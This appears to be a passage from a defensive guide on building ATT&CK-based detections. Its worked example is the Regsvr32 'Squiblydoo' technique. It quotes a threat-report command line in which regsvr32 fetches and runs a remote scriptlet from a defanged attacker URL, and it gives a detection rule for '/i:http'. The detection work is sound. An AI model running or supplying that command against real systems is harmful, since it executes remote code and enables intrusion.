# An exercise

If your organization has already taken the first steps in collecting data and using existing analytics, now is a good time to expand coverage by creating your own. Completing this exercise for your enterprise also has the added benefit of familiarizing you with the thought process behind creating detections and analytics.

- Begin with looking at the technique description from ATT&CK and the threat intel reports linked in the examplesHere’s an example provided by MITRE in their [Getting Started with ATT&CK](https://www.mitre.org/sites/default/files/publications/mitre-getting-started-with-attack-october-2019.pdf) paper:Let’s pretend there were no good detections for Regsvr32. The ATT&CK page lists several different variants for how Regsvr32 is used. Rather than writing one analytic to cover all of them, focus in on just one aspect to avoid spinning your wheels. For example, you might want to detect the “Squiblydoo” variant that was discovered by Casey Smith at Red Canary.The reports linked from the examples show several instances of command lines where Regsvr32 was used, such as this example from the Cybereason analysis of Cobalt Kitty:The attackers downloaded COM scriplets using regsvr32.exe: regsvr32 /s/n/u/i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll EVIDENCE OF SQUIBLYDOO USED BY COBALT KITTY
- Design a test for your analytics using the techniques you’ve discovered. Testing can be done with either a commercial or open-source BAS solution.Continuing with the example above - I would look at the tests available for Regsvr32, including Squiblydoo.
- After executing the test, review the log data generated during the attack. Look for things that make the malicious event look distinctive. 18 Squiblydoo was chosen as an example because it’s a bit easier to find in log data. There isn’t a legitimate reason to have regsvr32.exe call out to the Internet. In this case, the analytic to look for would be times when the regsvr32.exe process is created and the command line includes “/i:http”.